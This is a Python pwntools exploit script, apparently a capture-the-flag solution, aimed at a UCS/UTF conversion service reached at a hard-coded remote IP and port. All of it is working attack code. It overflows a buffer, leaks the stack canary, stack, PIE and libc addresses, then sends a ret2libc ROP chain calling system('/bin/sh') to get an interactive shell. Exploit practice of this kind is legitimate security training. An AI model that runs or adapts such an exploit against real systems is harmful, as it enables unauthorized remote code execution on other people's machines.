from pwn import *

elf = ELF('./conv')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def ucs_to_utf(length, payload):
	p.recvuntil(b'> ')
	p.sendline(b'1')
	p.sendlineafter(b': ', str(length).encode('utf-8'))
	p.sendafter(b': ', (payload))

def utf_to_ucs(length, payload):
	p.recvuntil(b'> ')
	p.sendline(b'2')
	p.sendlineafter(b': ', str(length).encode('utf-8'))
	p.sendafter(b': ', (payload))

l = 1026

while(1):
	# p = process('./conv')
	p = remote('34.124.217.71', 31337)

	ucs_to_utf(l, p32(0x61)*l)
	res = p.recvuntil(b'*************************')

	if(b'Error' not in res):
		utf_to_ucs(12, res[1044:1056])
		p.recvuntil(b': ')

		canary = u64(p.recv(8))
		log.info('canary: ' + hex(canary))

		utf_to_ucs(9, res[1056:1065])

		stack_leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
		log.info('stack_leak: ' + hex(stack_leak))

		utf_to_ucs(10, res[1065:1075])
		p.recvuntil(b': ')

		pie_leak = u64(p.recv(6).ljust(8, b'\x00'))
		log.info('pie_leak: ' + hex(pie_leak))

		pie_base = pie_leak - 0x1a9a
		log.info('pie_base: ' + hex(pie_base))

		pop_rdi = pie_base + 0x1b93
		ret = pie_base + 0x101a

		ucs_to_utf(l + 8, p32(0x61)*l + p64(canary) + p64(stack_leak) + p64(pie_leak) + p32(0x61)*2)
		res = p.recvuntil(b'*************************')

		if(b'Error' in res):
			p.close()
			continue
		break
	p.close()
	continue

utf_to_ucs(9, res[1076:1085])
p.recvuntil(b': ')

libc_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info('libc_leak: ' + hex(libc_leak))

libc.address = libc_leak - libc.sym['__libc_start_main'] - 243
log.info('libc_base: ' + hex(libc.address))

system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))

ucs_to_utf(l + 12, p32(0x61)*l + p64(canary) + p64(stack_leak) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system))

p.interactive()